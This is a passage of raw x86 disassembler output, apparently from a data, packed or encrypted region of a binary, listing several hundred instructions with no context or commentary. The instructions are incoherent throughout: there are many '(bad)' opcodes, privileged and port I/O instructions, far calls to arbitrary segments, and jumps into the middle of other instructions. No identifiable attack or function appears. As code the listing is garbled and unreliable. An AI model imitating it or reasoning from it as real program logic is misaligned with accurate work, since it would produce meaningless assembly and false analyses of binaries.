  413782:	mov    bh,0x5b
  413784:	mov    cl,0xca
  413786:	(bad)  
  413787:	sar    BYTE PTR fs:[edx+0x2a],1
  41378b:	sub    ecx,DWORD PTR [ebx+0x43]
  41378e:	shl    DWORD PTR [ebx-0x4e],cl
  413791:	cmc    
  413792:	pushf  
  413793:	dec    ebx
  413794:	test   BYTE PTR [ebp-0x6d],ch
  413797:	fiadd  DWORD PTR [esi+0x49]
  41379a:	or     esp,DWORD PTR [eax+ecx*4-0x51]
  41379e:	inc    edx
  41379f:	out    dx,al
  4137a0:	out    dx,al
  4137a1:	cmp    al,0xfc
  4137a3:	sbb    ch,0xbb
  4137a6:	out    0x3a,eax
  4137a8:	(bad)  
  4137aa:	fsub   QWORD PTR [esi]
  4137ac:	ds push ebx
  4137ae:	test   al,0x54
  4137b0:	dec    cl
  4137b2:	add    bl,BYTE PTR [ebp-0x45]
  4137b5:	cwde   
  4137b6:	dec    eax
  4137b7:	sbb    ah,dl
  4137b9:	fs (bad) 
  4137bb:	inc    esp
  4137bc:	cmp    edx,DWORD PTR [ebx+0x9]
  4137bf:	pop    es
  4137c0:	sub    dh,dh
  4137c2:	push   ebx
  4137c3:	jp     0x41374d
  4137c5:	dec    ecx
  4137c6:	test   dl,ah
  4137c8:	das    
  4137c9:	fisttp QWORD PTR [esi+0x6d]
  4137cd:	push   ebp
  4137ce:	sbb    edi,DWORD PTR [eax-0x4f5922d7]
  4137d4:	adc    BYTE PTR [eax-0x7ad3fdd8],ch
  4137da:	repz cli 
  4137dc:	aaa    
  4137dd:	jo     0x41381b
  4137df:	sub    dl,BYTE PTR [ebp-0x1]
  4137e2:	and    eax,0x72258776
  4137e7:	clc    
  4137e8:	dec    ecx
  4137e9:	rcl    DWORD PTR [edx-0x4d],0x44
  4137ed:	jb     0x413807
  4137ef:	sahf   
  4137f0:	xrelease xchg BYTE PTR ds:0xb8404af0,dh
  4137f7:	call   0x72e:0x691e508f
  4137fe:	xor    ebp,esp
  413800:	ins    DWORD PTR es:[edi],dx
  413801:	pusha  
  413802:	int3   
  413803:	leave  
  413804:	ds data16 aaa 
  413807:	test   DWORD PTR [ecx-0x22],edi
  41380a:	mov    DWORD PTR [ebx],edi
  41380c:	call   0xd4b:0xf545888a
  413813:	mov    eax,0xf637650e
  413818:	and    ah,BYTE PTR [esi+edi*8-0x54]
  41381c:	adc    dl,dh
  41381e:	xchg   ecx,eax
  41381f:	retf   
  413820:	imul   eax,DWORD PTR [edi],0xffffff96
  413823:	sahf   
  413824:	ins    BYTE PTR es:[edi],dx
  413825:	aas    
  413826:	loopne 0x41384c
  413828:	call   0xf1413f9
  41382d:	push   ecx
  41382e:	pop    edx
  41382f:	div    DWORD PTR [ebp+0x160a94ab]
  413835:	xor    eax,0x1d3cd122
  41383a:	mov    al,ds:0xb3146fa1
  41383f:	and    al,BYTE PTR [edx]
  413841:	lods   al,BYTE PTR ds:[esi]
  413842:	mov    ebx,0xdc968396
  413847:	stos   WORD PTR es:[edi],ax
  413849:	dec    dl
  41384b:	int3   
  41384c:	scas   eax,DWORD PTR es:[edi]
  41384d:	inc    edi
  41384e:	sbb    ch,BYTE PTR [ecx]
  413850:	mov    ah,dl
  413852:	dec    edi
  413853:	les    eax,FWORD PTR [ebx-0x54572a36]
  413859:	xor    eax,0x92c9fdec
  41385e:	pop    edx
  41385f:	ret    0x5575
  413862:	cmp    eax,0xf58a2fdf
  413867:	mov    edi,0xa3163d53
  41386c:	stos   DWORD PTR es:[edi],eax
  41386d:	push   ebp
  41386e:	les    eax,FWORD PTR [ecx+0x35]
  413871:	into   
  413872:	mov    ebx,edx
  413874:	je     0x413806
  413876:	in     al,0x19
  413878:	ret    
  413879:	and    DWORD PTR [eax+0x24ea960f],esp
  41387f:	mov    esi,0x7a3c4f3e
  413884:	aas    
  413885:	dec    BYTE PTR [edi+ecx*8]
  413888:	mov    DWORD PTR [edx],0x8505e47b
  41388e:	cmp    ebx,DWORD PTR [edx-0x30]
  413891:	arpl   WORD PTR [ebx-0xf5efbc0],di
  413897:	push   edi
  413898:	inc    ebp
  413899:	fbld   TBYTE PTR [edi]
  41389b:	mov    ds:0x6b3d0b1f,eax
  4138a0:	iret   
  4138a1:	rcr    DWORD PTR [ebx+0x16],1
  4138a4:	adc    ch,dh
  4138a6:	loopne 0x41382c
  4138a8:	imul   ebp,edi,0x56db2c10
  4138ae:	xchg   DWORD PTR [ecx],ecx
  4138b0:	pusha  
  4138b1:	adc    DWORD PTR [edi+0x1e],ebp
  4138b4:	push   cs
  4138b5:	dec    ecx
  4138b6:	mov    ah,0xf9
  4138b8:	push   ecx
  4138b9:	cli    
  4138ba:	pop    ebp
  4138bb:	mov    ah,0x23
  4138bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138be:	push   ebp
  4138bf:	add    DWORD PTR ds:0x2219121e,edi
  4138c5:	dec    ebp
  4138c6:	call   FWORD PTR [ecx]
  4138c8:	fiadd  DWORD PTR [edi+0x32]
  4138cb:	mov    ch,0xa5
  4138cd:	loope  0x413891
  4138cf:	xchg   edi,eax
  4138d0:	retf   0xfc59
  4138d3:	ins    DWORD PTR es:[edi],dx
  4138d4:	cwde   
  4138d5:	inc    ebx
  4138d6:	xor    eax,0xe6c598b4
  4138db:	pop    ebx
  4138dc:	retf   
  4138dd:	xchg   esp,eax
  4138de:	mov    edi,0x22cd080a
  4138e3:	pop    ecx
  4138e4:	stc    
  4138e5:	aas    
  4138e6:	and    edx,edx
  4138e8:	retf   0x3f72
  4138eb:	aad    0x5e
  4138ed:	adc    ecx,DWORD PTR [edi+0x1805bb92]
  4138f3:	push   0xffffffc2
  4138f5:	pop    edi
  4138f6:	mov    gs,WORD PTR [edi]
  4138f8:	jecxz  0x41388c
  4138fa:	pop    ebx
  4138fb:	fadd   st(4),st
  4138fd:	imul   edx,DWORD PTR [edi],0x532ba06d
  413903:	adc    DWORD PTR [ecx-0x3f],0xffffffe9
  413907:	sbb    ebp,edi
  413909:	(bad)  
  41390a:	dec    ebx
  41390b:	push   esp
  41390c:	jno    0x41396a
  41390e:	cli    
  41390f:	(bad)  [eax-0x1ff9c7e7]
  413915:	shr    DWORD PTR [edi],cl
  413917:	(bad)  
  413919:	cli    
  41391a:	and    eax,0xdf24f868
  41391f:	jo     0x4138bb
  413921:	or     BYTE PTR [esi+edx*4],cl
  413924:	(bad)  
  413925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413926:	bound  eax,QWORD PTR [ecx]
  413928:	sbb    eax,DWORD PTR [eax-0x32]
  41392b:	sub    esp,0xffffffeb
  41392e:	cmp    BYTE PTR [ebx+0x1232391b],ah
  413934:	(bad)  
  413935:	jne    0x4138f3
  413937:	jo     0x413901
  413939:	shl    BYTE PTR ds:0xe8290ee8,cl
  41393f:	lea    ebx,[eax+0x6c5f7994]
  413945:	(bad)  
  413946:	and    esi,edi
  413948:	add    BYTE PTR [esi],bh
  41394a:	xchg   ebx,eax
  41394b:	scas   al,BYTE PTR es:[edi]
  41394c:	enter  0xc6a2,0x74
  413950:	fsub   DWORD PTR [eax]
  413952:	daa    
  413953:	add    eax,0x2171697
  413958:	adc    edx,DWORD PTR [edx-0x3e]
  41395b:	cmc    
  41395c:	or     BYTE PTR [ebx-0x52],ah
  41395f:	(bad)  
  413961:	push   ebp
  413962:	xchg   esi,eax
  413963:	push   eax
  413964:	jo     0x41397d
  413966:	mov    al,ds:0x5ca1b953
  41396b:	mov    eax,ds:0x5bf504a1
  413970:	test   cl,ah
  413972:	adc    eax,0x59283f69
  413977:	jp     0x413959
  413979:	loop   0x413939
  41397b:	and    dh,bh
  41397d:	mov    ds:0xb18bfaa0,eax
  413982:	inc    edx
  413983:	mov    edx,0x12e2f4c3
  413988:	gs push esi
  41398a:	inc    ebp
  41398b:	aaa    
  41398c:	or     BYTE PTR [ecx-0x78],dh
  41398f:	mov    al,ds:0x44421668
  413994:	jecxz  0x4139d2
  413996:	sbb    al,0xea
  413998:	dec    esi
  413999:	scas   al,BYTE PTR es:[edi]
  41399a:	fstp   QWORD PTR [ebp+0x2b]
  41399d:	popa   
  41399e:	adc    esp,DWORD PTR [eax-0x788ac654]
  4139a4:	rol    DWORD PTR [eax],cl
  4139a6:	mov    esi,edi
  4139a8:	out    dx,al
  4139a9:	cs inc ecx
  4139ab:	lahf   
  4139ac:	aad    0xe9
  4139ae:	out    dx,al
  4139af:	mov    dl,0xf8
  4139b1:	fst    QWORD PTR [edi]
  4139b3:	(bad)  
  4139b4:	inc    esp
  4139b5:	xor    ebx,DWORD PTR ds:[edx+0x1afc1ed5]
  4139bc:	pop    ss
  4139bd:	mov    edx,DWORD PTR [edi+ebp*2-0x5b26019b]
  4139c4:	mov    al,ds:0xc599f90e
  4139c9:	das    
  4139ca:	cld    
  4139cb:	js     0x4139eb
  4139cd:	xchg   DWORD PTR [edi-0x7d8d3799],eax
  4139d3:	add    DWORD PTR [ecx-0x1e],ecx
  4139d6:	mov    ds:0x938079c7,al
  4139db:	sub    al,0x33
  4139dd:	pop    esp
  4139de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139df:	jns    0x413980
  4139e1:	sbb    DWORD PTR [esi],eax
  4139e3:	cmp    al,0x42
  4139e5:	ja     0x4139b6
  4139e7:	js     0x4139e1
  4139e9:	loopne 0x413a37
  4139eb:	aaa    
  4139ec:	scas   eax,DWORD PTR es:[edi]
  4139ed:	fdivr  QWORD PTR [eax]
  4139ef:	shl    DWORD PTR [ebx],1
  4139f1:	dec    edx
  4139f2:	adc    DWORD PTR [ebx-0x20],0x9c87815a
  4139f9:	dec    edi
  4139fa:	add    ebp,ebp
  4139fc:	or     esp,ecx
  4139fe:	fadd   DWORD PTR [ebx+0x68a52e04]
  413a04:	xor    al,BYTE PTR [edi]
  413a06:	or     esp,DWORD PTR [esi]
  413a08:	pop    esp
  413a09:	adc    BYTE PTR [ecx-0xd4842df],bl
  413a0f:	sub    dh,ah
  413a11:	add    al,0x2f
  413a13:	or     BYTE PTR [edx-0x12ff6ef9],cl
  413a19:	(bad)  
  413a1a:	fist   WORD PTR [ebx+0x73]
  413a1d:	cdq    
  413a1e:	stos   DWORD PTR es:[edi],eax
  413a1f:	xchg   edx,eax
  413a20:	aaa    
  413a21:	shl    DWORD PTR ds:[edx-0x1a],0x8d
  413a26:	test   al,0xfc
  413a28:	outs   dx,BYTE PTR ds:[esi]
  413a29:	add    DWORD PTR [edi-0xb2d49fd],eax
  413a2f:	lock push es
  413a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a32:	mov    bl,0x37
  413a34:	(bad)  
  413a35:	add    eax,0xc5967e6e
  413a3a:	jnp    0x413a7b
  413a3c:	imul   esp,DWORD PTR [ebx+0x5d],0x24
  413a40:	call   0x2fec90fe
  413a45:	fdiv   st(3),st
  413a47:	jns    0x4139d2
  413a49:	shl    al,cl
  413a4b:	pushf  
  413a4c:	shl    BYTE PTR [ebp+0x235d23e7],cl
  413a52:	std    
  413a53:	push   ss
  413a54:	push   esi
  413a55:	imul   esi,eax,0x51bdcf5d
  413a5b:	jae    0x4139eb
  413a5d:	aas    
  413a5e:	add    bh,BYTE PTR [edx]
  413a60:	xor    al,0xb
  413a62:	xchg   ecx,eax
  413a63:	mov    edx,0xc13a3e36
  413a68:	arpl   bp,di
  413a6a:	sbb    BYTE PTR [edi+ebx*1+0x2d9dcbf7],dh
  413a71:	add    al,0xb4
  413a73:	mov    eax,0xcceba67e
  413a78:	leave  
  413a79:	inc    esi
  413a7a:	push   cs
  413a7b:	nop
  413a7c:	jmp    0x413a34
  413a7e:	into   
  413a7f:	adc    al,0xc
  413a81:	mov    al,0x4d
  413a83:	sysexit 
  413a85:	imul   esi,ecx,0x17
  413a88:	icebp  
  413a89:	and    al,0x2c
  413a8b:	jecxz  0x413a92
  413a8d:	sbb    eax,0x2396ab76
  413a92:	sbb    DWORD PTR [ebx],ebp
  413a94:	push   cs
  413a95:	xor    DWORD PTR [ebx-0x43],ebp
  413a98:	ins    BYTE PTR es:[edi],dx
  413a99:	cwde   
  413a9a:	pop    esp
  413a9b:	dec    edi
  413a9c:	mov    al,ds:0xfb30ee9
  413aa1:	enter  0x16fd,0xef
  413aa5:	jg     0x413ac3
  413aa7:	js     0x413a7e
  413aa9:	gs sbb eax,0x4f73a3f
  413aaf:	(bad)  
  413ab0:	xor    BYTE PTR [esi-0x7dfaf408],0xe
  413ab7:	loope  0x413a5c
  413ab9:	dec    esp
  413aba:	outs   dx,BYTE PTR ds:[esi]
  413abb:	add    ebp,DWORD PTR [edi]
  413abd:	inc    edi
  413abe:	test   al,0xc9
  413ac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ac1:	mov    bh,0xd3
  413ac3:	and    BYTE PTR [edi+edx*8],0x93
  413ac7:	sbb    DWORD PTR [edx],esp
  413ac9:	jg     0x413b0f
  413acb:	loop   0x413ab8
  413acd:	sub    edi,DWORD PTR [edx+0x666448bf]
  413ad3:	add    ebp,DWORD PTR [ebx+0x46]
  413ad6:	adc    BYTE PTR [esi],dl
  413ad8:	call   0x690b:0x5dd21e9d
  413adf:	les    ebx,FWORD PTR [edx-0x77]
  413ae2:	dec    edi
  413ae3:	fistp  WORD PTR [ebx-0x6b91f267]
  413ae9:	and    BYTE PTR ds:0xbfd68803,ah
  413aef:	add    al,0x34
  413af1:	sub    eax,0xfefcfb32
  413af6:	mov    cs,WORD PTR [edx+0x55]
  413af9:	inc    ebx
  413afa:	push   cs
  413afb:	or     al,0x60
  413afd:	and    DWORD PTR [ecx+0x27],0x4923175a
  413b04:	movzx  ebx,BYTE PTR [edx+0x1d3c0525]
  413b0b:	leave  
  413b0c:	add    DWORD PTR [edi-0x64fc8f35],edx
  413b12:	add    DWORD PTR [ecx-0x6fd159a4],eax
  413b18:	inc    ebx
  413b19:	pushf  
  413b1a:	pop    esp
  413b1b:	test   eax,0x700bf640
  413b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b21:	pop    ss
  413b22:	mov    edi,0x35c5828
  413b27:	das    
  413b28:	fadd   DWORD PTR [ecx+eax*1+0x23]
  413b2c:	ins    BYTE PTR es:[edi],dx
  413b2d:	gs inc esp
  413b2f:	mov    bh,0x63
  413b31:	test   eax,0xb1683524
  413b36:	jne    0x413b94
  413b38:	fcompp 
  413b3a:	out    dx,eax
  413b3b:	dec    esp
  413b3c:	jp     0x413b7b
  413b3e:	mov    ds:0xf831ffdd,eax
  413b43:	mov    ds:0xbf3aeefd,eax
  413b48:	fldlg2 
  413b4a:	push   0x8f38acdd
  413b4f:	and    al,0xf3
  413b51:	sbb    al,0xe3
  413b53:	ret    
  413b54:	mov    edx,0x76ff39c0
  413b59:	fstp   QWORD PTR [ebx]
  413b5b:	and    eax,0xb0b5c38e
  413b60:	ss jp  0x413b18
  413b63:	mov    WORD PTR [ecx],?
  413b65:	loopne 0x413b57
  413b67:	and    ch,0x9a
  413b6a:	fdiv   DWORD PTR [edi-0x32668b78]
  413b70:	imul   edx,DWORD PTR [ecx+edx*8+0x341ca614],0x1d
  413b78:	add    al,0x1f
  413b7a:	or     DWORD PTR [ecx],0x76
  413b7d:	mov    al,ds:0x207c6632
  413b82:	lock (bad) 
  413b84:	mov    ebp,0xe10b6cc8
  413b89:	mov    al,ds:0x32c29dd0
  413b8e:	enter  0xbe7b,0xa8
  413b92:	inc    ecx
  413b93:	add    eax,0x3f2714b0
  413b98:	add    bl,BYTE PTR [esi]
  413b9a:	mov    ebp,0x4372b3e3
  413b9f:	pop    ebp
  413ba0:	arpl   bx,dx
  413ba2:	popf   
  413ba3:	xchg   BYTE PTR [edi+0x63f92581],cl
  413ba9:	imul   DWORD PTR [edx-0x7e8f1c19]
  413baf:	aaa    
  413bb0:	loopne 0x413b3a
  413bb2:	mov    ch,0xbc
  413bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bb5:	jmp    0x6130:0x406e9ae
  413bbc:	test   al,0xa3
  413bbe:	mov    fs,WORD PTR [edx+0x52]
  413bc1:	cmp    eax,DWORD PTR [ebp+0x2db4d73b]
  413bc7:	pop    esi
  413bc8:	scas   al,BYTE PTR es:[edi]
  413bc9:	cdq    
  413bca:	sbb    eax,0xbbd72d4d
  413bcf:	ja     0x413b76
  413bd1:	popf   
  413bd2:	aaa    
  413bd3:	dec    ebx
  413bd4:	push   edi
  413bd5:	cmp    al,0xc9
  413bd7:	enter  0x3c2d,0xec
  413bdb:	xor    edx,esi
  413bdd:	push   eax
  413bde:	mov    edi,DWORD PTR [ecx]
  413be0:	mov    ds:0xb4aa43d1,al
  413be5:	sbb    eax,0x102fb877
  413bea:	sti    
  413beb:	xchg   esi,eax
  413bec:	mov    esi,DWORD PTR ds:0x131abc44
  413bf2:	cld    
  413bf3:	fdivr  DWORD PTR [eax-0x262b23bd]
  413bf9:	jg     0x413b84
  413bfb:	add    al,0xa1
  413bfd:	inc    esi
  413bfe:	out    0xd6,eax
  413c00:	outs   dx,BYTE PTR ds:[esi]
  413c01:	mov    edx,0xde1eda4f
  413c06:	mov    dh,0x39
  413c08:	outs   dx,DWORD PTR ds:[esi]
  413c09:	bound  ebp,QWORD PTR [esi+0x52]
  413c0c:	adc    DWORD PTR [eax],ebx
  413c0e:	retf   0x53d8
  413c11:	fcmovne st,st(7)
  413c13:	xchg   ebp,eax
  413c14:	in     eax,0x35
  413c16:	sub    esi,DWORD PTR [esi+esi*8-0x5c]
  413c1a:	test   al,0xd0
  413c1c:	ret    0xa419
  413c1f:	pop    ss
  413c20:	call   0x5def9ade
  413c25:	pusha  
  413c26:	jge    0x413bec
  413c28:	add    BYTE PTR [ebx+0x3e],ah
  413c2b:	mov    cl,0xd
  413c2d:	int3   
  413c2e:	and    BYTE PTR [esi-0x63],bl
  413c31:	jle    0x413c80
  413c33:	xor    edi,0xffffffe7
  413c36:	add    DWORD PTR [edi+0x78395e2a],ecx
  413c3c:	sub    al,0xf9
  413c3e:	cli    
  413c3f:	sti    
  413c40:	jmp    0xd35e13c1
  413c45:	pop    ds
  413c46:	cld    
  413c47:	push   edx
  413c48:	mov    ds:0x3d57339f,eax
  413c4d:	sbb    dl,BYTE PTR [edx-0x6a0b4359]
  413c53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c54:	pop    ss
  413c55:	addr16 int 0xa6
  413c58:	sbb    dl,al
  413c5a:	cmp    ecx,edx
  413c5c:	jmp    0x7cd05f2b
  413c61:	pop    edx
  413c62:	(bad)  
  413c63:	jmp    0x413bed
  413c65:	or     BYTE PTR [ecx+edx*4+0x44],0xe
  413c6a:	out    dx,eax
  413c6b:	push   es
  413c6c:	test   BYTE PTR [ecx-0x9],cl
  413c6f:	(bad)  
  413c70:	pop    ds
  413c71:	push   ds
  413c72:	add    edi,DWORD PTR [edx]
  413c74:	fnsave [ebx-0x291bb429]
  413c7a:	xor    eax,esi
  413c7c:	(bad)  
  413c7e:	lock ins BYTE PTR es:[edi],dx
  413c80:	jns    0x413cad
  413c82:	pop    edx
  413c83:	popf   
  413c84:	cmp    al,0x65
  413c86:	or     ecx,esp
  413c88:	sbb    ebx,eax
  413c8a:	ds out 0x19,eax
  413c8d:	jmp    0x4d1e91de
  413c92:	loopne 0x413cba
  413c94:	cmp    ebx,DWORD PTR [edx+0x33]
  413c97:	sbb    dl,BYTE PTR [eax-0x6da14d6f]
  413c9d:	push   ebx
  413c9e:	mov    eax,ds:0x715d411b
  413ca3:	pop    ebp
  413ca4:	sbb    edx,ecx
  413ca6:	mov    ds,WORD PTR [ecx-0x1]
  413ca9:	inc    ecx
  413caa:	sar    edx,cl
  413cac:	mov    esi,0xb4d42056
  413cb1:	dec    edx
  413cb2:	or     al,0x4
  413cb4:	push   0x3e
  413cb6:	jecxz  0x413ce2
  413cb8:	jmp    0x6c19d513
  413cbd:	jle    0x413c75
  413cbf:	cmp    ebx,DWORD PTR [ecx+0x47]
  413cc2:	fs ss and eax,0xcf879288
  413cc9:	arpl   WORD PTR [ebx-0x6e080511],bx
  413ccf:	mov    esi,0xc3e67892
  413cd4:	leave  
  413cd5:	xor    ebp,DWORD PTR [esi]
  413cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cd8:	jns    0x413c7d
  413cda:	stos   DWORD PTR es:[edi],eax
  413cdb:	jge    0x413c91
  413cdd:	scas   al,BYTE PTR es:[edi]
  413cde:	lock jg 0x413ccb
  413ce1:	test   DWORD PTR ds:0x3dfcc690,edi
  413ce7:	cli    
  413ce8:	add    DWORD PTR [eax+0x45],edi
  413ceb:	mov    ah,0x37
  413ced:	xor    BYTE PTR [edx+0x30],dl
  413cf0:	int    0x54
  413cf2:	in     eax,0xac
  413cf4:	sbb    eax,0x491cce64
  413cf9:	mov    esp,DWORD PTR [ebx]
  413cfb:	ins    BYTE PTR es:[edi],dx
  413cfc:	and    cl,BYTE PTR [edi+ebx*4]
  413cff:	aaa    
  413d00:	add    esp,DWORD PTR [edx+0x66]
  413d03:	lds    edx,FWORD PTR [esi-0x2d435ba2]
  413d09:	push   edx
  413d0a:	rcr    DWORD PTR [ecx+0x3d],cl
  413d0d:	in     al,0xba
  413d0f:	jg     0x413cfa
  413d11:	int    0x7d
  413d13:	or     ch,BYTE PTR [ebx+0x35]
  413d16:	and    al,0x21
  413d18:	mov    WORD PTR [edx],es
  413d1a:	add    edi,ebx
  413d1c:	jne    0x413d00
  413d1e:	push   ebp
  413d1f:	fidiv  DWORD PTR [esi-0x66d498ae]
  413d25:	and    BYTE PTR [eax],al
  413d27:	jo     0x413cdb
  413d29:	sbb    BYTE PTR [ebx],dl
  413d2b:	jmp    0x5962:0x55cfade7
  413d32:	mov    esp,0x78b02b42
  413d37:	bound  eax,QWORD PTR [ecx+0x103b3c2b]
  413d3d:	sub    BYTE PTR [ebx+0x4e52691e],bl
  413d43:	std    
  413d44:	adc    eax,0xef23f2ed
  413d49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d4a:	dec    esp
  413d4b:	sahf   
  413d4c:	fidiv  DWORD PTR [edi]
  413d4e:	fist   DWORD PTR [ecx]
  413d50:	in     eax,dx
  413d51:	hlt    
  413d52:	outs   dx,BYTE PTR ds:[esi]
  413d53:	mov    cl,BYTE PTR [eax-0x68]
  413d56:	js     0x413cfc
  413d58:	pop    edx
  413d59:	sub    ecx,edi
  413d5b:	xchg   edx,eax
  413d5c:	loopne 0x413d6b
  413d5e:	sbb    eax,0xebe1956
  413d63:	cmpps  xmm7,XMMWORD PTR [ebp-0x44ac8eb5],0xa1
  413d6b:	push   cs
  413d6c:	lea    edx,[eax-0x5208c739]
  413d72:	dec    edi
  413d73:	fsub   DWORD PTR [ebp+0x3]
  413d76:	inc    ebp
  413d77:	retf   
  413d78:	or     ch,BYTE PTR [eax-0x6d]
  413d7b:	fmulp  st(1),st
  413d7d:	or     ch,0x9d
  413d80:	fimul  WORD PTR [ebp-0x57]
  413d83:	imul   edi,DWORD PTR ds:0x8f205e3c,0x3beb4822
  413d8d:	jge    0x413d43
  413d8f:	and    esi,ebp
  413d91:	ins    DWORD PTR es:[edi],dx
  413d92:	add    eax,0xb724e7aa
  413d97:	hlt    
  413d98:	retf   
  413d99:	lds    ebp,FWORD PTR [esi+0x4f]
  413d9c:	(bad)  
  413d9d:	fsub   st(7),st
  413d9f:	ficomp WORD PTR [esi+ebp*4+0x66]
  413da3:	push   edx
  413da4:	fwait
  413da5:	ror    DWORD PTR [ebx-0x62],0xaa
  413da9:	in     eax,dx
  413daa:	es xchg ebp,eax
  413dac:	mov    ds:0x1cf847c6,eax
  413db1:	aas    
  413db2:	imul   edx,esi,0x34
  413db5:	out    0xa0,al
  413db7:	in     al,dx
  413db8:	push   esp
  413db9:	popa   
  413dba:	sub    eax,0x8eecae1c
  413dbf:	sahf   
  413dc0:	int    0x6e
  413dc2:	dec    esp
  413dc3:	jle    0x413d47
  413dc5:	(bad)  
  413dc6:	fcom   DWORD PTR [edi]
  413dc8:	fsub   st,st(6)
  413dca:	out    dx,al
  413dcb:	(bad)  
  413dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dcd:	cmp    eax,0x4329a272
  413dd2:	sub    ch,BYTE PTR [edx+0x20504192]
  413dd8:	adc    ebp,DWORD PTR [esi-0x37efb979]
  413dde:	pusha  
  413ddf:	out    dx,eax
  413de0:	sbb    al,ch
  413de2:	mov    ah,ch
  413de4:	shrd   ebp,edx,0x6b
  413de8:	pop    ss
  413de9:	dec    ebp
  413dea:	jp     0x413d7f
  413dec:	pop    ss
  413ded:	int3   
  413dee:	cmp    BYTE PTR [ebx],ch
  413df0:	cwde   
  413df1:	dec    esp
  413df2:	in     eax,0x3d
  413df4:	les    ecx,FWORD PTR [ebp+0x34]
  413df7:	inc    eax
  413df8:	push   ebx
  413df9:	mov    eax,ds:0x3891ea78
  413dfe:	stos   DWORD PTR es:[edi],eax
  413dff:	mov    dh,0x11
  413e01:	xchg   ebp,eax
  413e02:	pop    edx
  413e03:	push   cs
  413e04:	and    edi,edx
  413e06:	(bad)  
  413e08:	push   ss
  413e09:	xlat   BYTE PTR ds:[ebx]
  413e0a:	ins    DWORD PTR es:[edi],dx
  413e0b:	cmp    DWORD PTR [esi],ecx
  413e0d:	and    al,BYTE PTR ds:0xc38a39fe
  413e13:	jg     0x413e78
  413e15:	cmp    BYTE PTR [ecx],ch
  413e17:	sbb    ebx,DWORD PTR [edi-0x44737939]
  413e1d:	int3   
  413e1e:	mov    eax,0xf62e7fd0
  413e23:	sbb    BYTE PTR [eax],al
  413e25:	nop
  413e26:	ja     0x413e6a
  413e28:	jmp    0xdba3:0xb846d06c
  413e2f:	push   esp
  413e30:	ret    0xcc81
  413e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e34:	dec    ebp
  413e35:	cld    
  413e36:	xchg   ecx,eax
  413e37:	cmp    ebp,DWORD PTR [ecx]
  413e39:	xor    BYTE PTR [ebx+0x7091ec2e],0x65
  413e40:	mov    bh,0x94
  413e42:	lahf   
  413e43:	fdivr  DWORD PTR [ebx+0x12]
  413e46:	imul   ebp,DWORD PTR [eax-0x7fa8510c],0xffffffca
  413e4d:	push   ds
  413e4e:	dec    DWORD PTR [edi+0x65029a6]
  413e54:	mov    ds:0x523951a3,al
  413e59:	jo     0x413e88
  413e5b:	sar    DWORD PTR [esi+0x30de1d98],1
  413e61:	fild   WORD PTR [ebx-0x2a371967]
  413e67:	adc    DWORD PTR [ebx+0x15ffcf94],0xb029495f
  413e71:	lds    ecx,FWORD PTR [ebp+0x51381f49]
  413e77:	hlt    
  413e78:	mov    esp,0x486c651e
  413e7d:	shl    DWORD PTR [ecx+0x7],0x42
  413e81:	lods   al,BYTE PTR ds:[esi]
  413e82:	add    al,0x88
  413e84:	stos   BYTE PTR es:[edi],al
  413e85:	sub    DWORD PTR [edi-0x5a0c3173],ebx
  413e8b:	cmp    eax,0xa320c24a
  413e90:	hlt    
  413e91:	(bad)  
  413e92:	imul   ebp,DWORD PTR [edx],0xd63b031d
  413e98:	int    0x8c
  413e9a:	loopne 0x413efc
  413e9c:	pop    ss
  413e9d:	sbb    BYTE PTR [esp+esi*1],0x9c
  413ea1:	in     eax,dx
  413ea2:	mov    eax,ds:0xc6557050
  413ea7:	sbb    eax,0x34acd76c
  413eac:	pop    ebx
  413ead:	(bad)  
  413eaf:	inc    ebx
  413eb0:	sub    DWORD PTR [ebx+0x46],ebx
  413eb3:	gs in  al,dx
  413eb5:	mov    dh,0x6f
  413eb7:	repnz ficomp DWORD PTR [eax+esi*1+0x11]
  413ebc:	fldenv [eax-0x40093fae]
  413ec2:	scas   al,BYTE PTR es:[edi]
  413ec3:	int    0x87
  413ec5:	stc    
  413ec6:	sub    eax,0x5b97daf6
  413ecb:	jl     0x413ef1
  413ecd:	out    dx,al
  413ece:	push   0x65
  413ed0:	or     al,0x78
  413ed2:	addr16 pop edx
  413ed4:	stos   BYTE PTR es:[edi],al
  413ed5:	loope  0x413ec3
  413ed7:	shr    ah,1
  413ed9:	pop    ss
  413eda:	(bad)  
  413edb:	aas    
  413edc:	clc    
  413edd:	movntps XMMWORD PTR [esi],xmm6
  413ee0:	lahf   
  413ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ee2:	es mov ch,0xc8
  413ee5:	rep ins WORD PTR es:[edi],dx
  413ee8:	scas   al,BYTE PTR es:[edi]
  413ee9:	mov    ebp,0x97e7bdb5
  413eee:	pop    edx
  413eef:	pop    ebp
  413ef0:	ret    
  413ef1:	push   cs
  413ef2:	jmp    0x6523:0xb256b30
  413ef9:	pusha  
  413efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413efb:	push   esp
  413efc:	push   cs
  413efd:	lds    ecx,FWORD PTR ds:0x51b54233
  413f03:	sbb    esi,DWORD PTR [edi+eiz*4-0x38]
  413f07:	mov    ss,WORD PTR [eax-0x20]
  413f0a:	retf   0x57d9
  413f0d:	in     eax,dx
  413f0e:	xchg   esi,eax
  413f0f:	in     al,dx
  413f10:	sahf   
  413f11:	dec    ecx
  413f12:	pop    esi
  413f13:	sbb    edi,edi
  413f15:	std    
  413f16:	ds push ebx
  413f18:	inc    eax
  413f19:	fld    QWORD PTR [edi+edi*8]
  413f1c:	int    0x98
  413f1e:	(bad)  
  413f1f:	out    0x87,al
  413f21:	cld    
  413f22:	in     eax,dx
  413f23:	loope  0x413eb9
  413f25:	and    BYTE PTR [eax],dl
  413f27:	(bad)
  413f2c:	xchg   edx,eax
  413f2d:	hlt    
  413f2e:	jl     0x413fa0
  413f30:	(bad)  
  413f31:	inc    ecx
  413f32:	add    eax,0x532f1890
